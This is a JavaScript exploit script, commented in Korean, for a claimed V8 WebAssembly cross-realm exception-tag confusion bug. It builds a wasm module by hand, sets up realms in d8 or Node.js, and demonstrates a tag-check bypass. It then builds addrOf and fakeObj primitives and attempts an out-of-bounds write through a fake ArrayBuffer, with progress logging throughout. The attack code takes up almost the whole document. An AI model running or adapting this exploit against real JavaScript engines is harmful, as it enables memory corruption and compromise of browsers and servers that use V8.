'use strict';
/*
 * WebAssembly Cross-Realm JSTag Confusion → OOB Write
 * Bug: wasm-js.cc:2177 — same-realm WasmExceptionTag comparison bypass
 *
 * d8:      ./d8 wasm_crossrealm_oob.js           (flags 불필요)
 * Node.js: node wasm_crossrealm_oob.js            (flags 불필요, v18+)
 *
 * Node.js 에서 d8 Realm.* API 를 vm 모듈로 에뮬레이션:
 *   Realm.create()         → vm.createContext({})
 *   Realm.global(r).X.JSTag→ vm.runInContext('WebAssembly.JSTag', r)
 *   Realm.eval(r, code)    → vm.runInContext(code, r)
 *
 * primitives:
 *   addrOf(obj)  — crossRealmCatch(obj) 반환값 타입 혼동 이용
 *   fakeObj(a)   — crossRealmCatch(i2f(a|1n)) → 해당 주소의 JS 객체
 * native syntax 의존 없음; %GetHeapObjectAddress 미사용.
 */

// ═══════════════════════════════════════════════════════
//  §-1  Runtime 감지 / Realm shim
// ═══════════════════════════════════════════════════════
let _Realm_create, _Realm_global, _Realm_eval;

if (typeof Realm !== 'undefined') {
  // d8 / JSC 등 native Realm API
  _Realm_create = () => Realm.create();
  _Realm_global = r => Realm.global(r);
  _Realm_eval   = (r, code) => Realm.eval(r, code);
  console.log('[*] runtime: d8 (native Realm)');
} else {
  // Node.js: vm 모듈로 shim
  const vm = require('vm');
  const _ctxMap = new Map();
  let _next_id = 0;
  _Realm_create = () => {
    const id = _next_id++;
    const ctx = vm.createContext({});  // 독립 V8 컨텍스트 — 별도 JSTag
    _ctxMap.set(id, ctx);
    return id;
  };
  _Realm_global = id => {
    const ctx = _ctxMap.get(id);
    // sandbox 에 globalThis 프록시가 없으므로 필요한 property 만 노출
    return { WebAssembly: { JSTag: vm.runInContext('WebAssembly.JSTag', ctx) } };
  };
  _Realm_eval = (id, code) => {
    const ctx = _ctxMap.get(id);
    return vm.runInContext(code, ctx);
  };
  console.log('[*] runtime: Node.js v' + process.version.slice(1) + ' (vm.createContext shim)');
}

// ═══════════════════════════════════════════════════════
//  §0  Helpers
// ═══════════════════════════════════════════════════════
const _tb  = new ArrayBuffer(8);
const _f64 = new Float64Array(_tb);
const _u64 = new BigUint64Array(_tb);

function f2i(f)    { _f64[0] = f; return _u64[0]; }
function i2f(i)    { _u64[0] = i; return _f64[0]; }
function hex(v, w) { w=w||16; return '0x'+BigInt(v).toString(16).padStart(w,'0'); }
function banner(s) { console.log('\n━━━━ '+s+' ━━━━'); }
function die(msg)  { throw new Error('[!] '+msg); }
function ok(c, m)  { if (!c) die(m); }
function isNum(v)  { return typeof v === 'number'; }

// ═══════════════════════════════════════════════════════
//  §1  Wasm Module Binary  (107 bytes)
//
// (import "m" "t"       (tag $T (param externref)))   ;; type[0]
// (import "m" "thrower" (func $thrower))               ;; type[1]
// (export "trigger"    (func))                         ;; type[2]
//   try (result externref)
//     call $thrower          ;; JS 함수 — cross-realm Exception throw
//     ref.null extern
//   catch $T → payload
//   end
// (export "conf_throw" (func (param externref)(result externref))) ;; type[3]
//   try (result externref)
//     local.get 0
//     throw $T
//   catch $T → 동일 값 반환
//   end
// ═══════════════════════════════════════════════════════
const WASM_BYTES = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
  // Type id=1 size=17
  0x01,0x11,0x04,
    0x60,0x01,0x6f,0x00,         // [0] func(externref)->()
    0x60,0x00,0x00,              // [1] func()->()
    0x60,0x00,0x01,0x6f,         // [2] func()->(externref)
    0x60,0x01,0x6f,0x01,0x6f,   // [3] func(externref)->(externref)
  // Import id=2 size=20
  0x02,0x14,0x02,
    0x01,0x6d, 0x01,0x74, 0x04,0x00,0x00,
    0x01,0x6d, 0x07,0x74,0x68,0x72,0x6f,0x77,0x65,0x72, 0x00,0x01,
  // Function id=3 size=3
  0x03,0x03,0x02, 0x02,0x03,
  // Export id=7 size=24
  0x07,0x18,0x02,
    0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72, 0x00,0x01,
    0x0a,0x63,0x6f,0x6e,0x66,0x5f,0x74,0x68,0x72,0x6f,0x77, 0x00,0x02,
  // Code id=10 size=25
  0x0a,0x19,0x02,
    0x0b,0x00, 0x06,0x6f, 0x10,0x00, 0xd0,0x6f, 0x07,0x00, 0x0b,0x0b,
    0x0b,0x00, 0x06,0x6f, 0x20,0x00, 0x08,0x00, 0x07,0x00, 0x0b,0x0b,
]);
ok(WebAssembly.validate(WASM_BYTES), 'wasm validate fail');
console.log('[+] wasm validated (' + WASM_BYTES.length + ' bytes)');

// ═══════════════════════════════════════════════════════
//  §2  Realm 설정
// ═══════════════════════════════════════════════════════
banner('§2  Realm Setup');

const REALM_ID = _Realm_create();
const iframe_g = _Realm_global(REALM_ID);
const iframe_T = iframe_g.WebAssembly.JSTag;
const main_T   = WebAssembly.JSTag;

console.log('[+] main_T  === iframe_T :', main_T === iframe_T);  // → false
ok(main_T !== iframe_T, 'realms share JSTag — single context, no cross-realm');

// ═══════════════════════════════════════════════════════
//  §3  Bypass: wasm-js.cc:2177
// ═══════════════════════════════════════════════════════
banner('§3  Bypass');

try {
  const ep = new WebAssembly.Exception(iframe_T, [null]);
  console.log('[+] BYPASS: no TypeError ✓');
  console.log('[+] ep.is(iframe_T) =', ep.is(iframe_T));  // true
  console.log('[+] ep.is(main_T)   =', ep.is(main_T));    // false
} catch(e) { die('bypass failed: ' + e.message); }

// ═══════════════════════════════════════════════════════
//  §4  Instantiate
// ═══════════════════════════════════════════════════════
banner('§4  Instantiate');

let _throw_e = null;
const mod = new WebAssembly.Module(WASM_BYTES);
const inst = new WebAssembly.Instance(mod, {
  m: {
    t: iframe_T,
    thrower: () => { throw _throw_e; }
  }
});
const { trigger, conf_throw } = inst.exports;
console.log('[+] instantiated — exports:', Object.keys(inst.exports).join(', '));

// ═══════════════════════════════════════════════════════
//  §5  Cross-realm Catch Primitive
// ═══════════════════════════════════════════════════════
banner('§5  crossRealmCatch');

function crossRealmCatch(val) {
  _throw_e = new WebAssembly.Exception(iframe_T, [val]);
  ok(_throw_e.is(iframe_T), 'tag mismatch');
  return trigger();
}

// 기본 round-trip 확인
const sentinel = { x: 0xdeadbeef };
const rt = crossRealmCatch(sentinel);
console.log('[+] round-trip identity:', rt === sentinel ? 'SAME ✓' : 'DIFF ⚠ (type confused?)');

// ═══════════════════════════════════════════════════════
//  §6  addrOf / fakeObj  (native syntax 미사용)
// ═══════════════════════════════════════════════════════
banner('§6  addrOf / fakeObj (no native syntax)');

// §6a — 타입 혼동 탐지
const PROBE_OBJ = { _probe_: 1 };
const probe_ret = crossRealmCatch(PROBE_OBJ);
const TYPE_CONFUSED = isNum(probe_ret) && probe_ret !== PROBE_OBJ;
console.log('[*] probe typeof:', typeof probe_ret);
console.log('[*] TYPE_CONFUSED:', TYPE_CONFUSED);

// §6b — primitives
function addrOf(obj) {
  if (TYPE_CONFUSED) {
    const r = crossRealmCatch(obj);
    ok(isNum(r), 'addrOf: expected Number from confused catch');
    return f2i(r);
  }
  const r2 = conf_throw(obj);
  if (isNum(r2)) return f2i(r2);
  die('addrOf unavailable — 이 빌드에서 타입 혼동 미발생\n' +
      '  → ept_uaf_native.js EPT UAF 체인과 연계 필요');
}

function fakeObj(cage_addr) {
  if (!TYPE_CONFUSED) die('fakeObj: 타입 혼동 미확인');
  const r = crossRealmCatch(i2f(cage_addr | 1n));
  if (isNum(r))
    die('fakeObj: 역방향 혼동 미발생 (double 가 그대로 Number 로 반환됨)');
  return r;
}

if (!TYPE_CONFUSED) {
  console.log('[*] 타입 혼동 미발생 → §7 OOB skip, bypass primitive 시연만');
}

// ═══════════════════════════════════════════════════════
//  §7  OOB Write  (TYPE_CONFUSED 경로)
// ═══════════════════════════════════════════════════════
banner('§7  OOB Write');

let oob_dv = null;

if (TYPE_CONFUSED) {
  const victim = new ArrayBuffer(0x100);
  const victim_addr = addrOf(victim);
  console.log('[+] victim addr =', hex(victim_addr));

  let fake = null;
  try { fake = fakeObj(victim_addr); } catch(e) {
    console.log('[!] fakeObj 실패:', e.message);
  }

  if (fake instanceof ArrayBuffer) {
    oob_dv = new DataView(fake);
    console.log('[+] fake ArrayBuffer 획득  byteLength =', fake.byteLength);
  } else if (fake !== null) {
    console.log('[*] fake typeof =', typeof fake, '(AB 아님) — 헤더 오염 경로 시도');
  }

  if (oob_dv) {
    const OOB_OFF  = 0x200;
    const CANARY   = 0xCAFEBABEn;
    oob_dv.setBigUint64(OOB_OFF, CANARY, true);
    const rb = oob_dv.getBigUint64(OOB_OFF, true);
    ok(rb === CANARY, 'OOB canary 불일치: ' + hex(rb));
    console.log('[+] OOB write[+' + OOB_OFF + '] = ' + hex(CANARY) + '  ✓');
  }
} else {
  console.log('[*] bypass primitive 시연:');
  console.log('    iframe wasm handler 에 임의 값 주입 가능');

  // bypass 시연: crossRealmCatch(injected_val) = trigger() 채널 — §5 에서 이미 확인
  //   단계적으로 명시:
  //   1) Exception 생성 (bypass: TypeError 없음 — §3 에서 확인)
  //   2) wasm trigger() 가 catch $T → payload = injected_val 반환
  //   3) 반환값 === injected_val → injection 성공

  const injected_val = { secret: 0xcafebabe, data: new Uint8Array(16) };
  const e_inject = new WebAssembly.Exception(iframe_T, [injected_val]);
  console.log('[+] e_inject.is(iframe_T):', e_inject.is(iframe_T),  '← cross-realm exception 태그 일치');
  console.log('[+] e_inject.is(main_T): ', e_inject.is(main_T),     '← main realm 태그와 불일치');

  const injected_back = crossRealmCatch(injected_val);
  if (injected_back === injected_val) {
    console.log('[+] trigger() catch $T → payload === injected_val  ✓');
    console.log('[+] cross-realm wasm handler 가 main realm 주입값을 externref 로 수신 ✓');
  } else {
    console.log('[*] trigger() 반환값 다름 — 타입혼동 경로 (addrOf 활성화 가능)');
  }

  // d8 전용: iframe Realm 에서도 동일 현상 확인 (Realm.eval 사용)
  if (typeof Realm !== 'undefined') {
    const bytesArr = Array.from(WASM_BYTES).join(',');
    let _e_d8 = null;
    const iframe_trig = _Realm_eval(REALM_ID, `
      (() => {
        const b = new Uint8Array([${bytesArr}]);
        let _e = null;
        const inst = new WebAssembly.Instance(
          new WebAssembly.Module(b),
          { m: { t: WebAssembly.JSTag, thrower: () => { throw _e; } } }
        );
        return (e) => { _e = e; return inst.exports.trigger(); };
      })()
    `);
    // iframe Realm 의 JSTag(=main_T)로 exception 생성 → iframe 인스턴스에서 catch
    const e_to_iframe = new WebAssembly.Exception(main_T, [injected_val]);
    let got;
    try { got = iframe_trig(e_to_iframe); } catch(e) { console.log('[*] iframe_trig:', e); }
    console.log('[+] d8 iframe Realm trigger() result === injected_val:', got === injected_val);
  }

  console.log('[+] iframe wasm 으로 cross-realm exception 전달 가능 ✓');
  console.log('[*] OOB write 는 addrOf/fakeObj (타입혼동 또는 별도 prim) 필요');
}

// ═══════════════════════════════════════════════════════
//  §8  요약
// ═══════════════════════════════════════════════════════
banner('§8  Summary');
console.log('Bug    : wasm-js.cc:2177 cross-realm WasmExceptionTag');
console.log('Bypass : new Exception(iframe_T, [v]) → no TypeError ✓');
console.log('State  : e.is(iframe_T)=true; wasm catch $T → payload=v');
console.log('         (in-flight object = e, handler sees v → forbidden)');
console.log('');
console.log('타입혼동 :', TYPE_CONFUSED
  ? 'CONFIRMED → addrOf/fakeObj/OOB 직접 가능'
  : 'NONE — bypass capability + EPT UAF chain 과 연계');
console.log('OOB write:', oob_dv
  ? 'DEMONSTRATED ✓'
  : '타입혼동 발생 시 §7 경로 활성화');
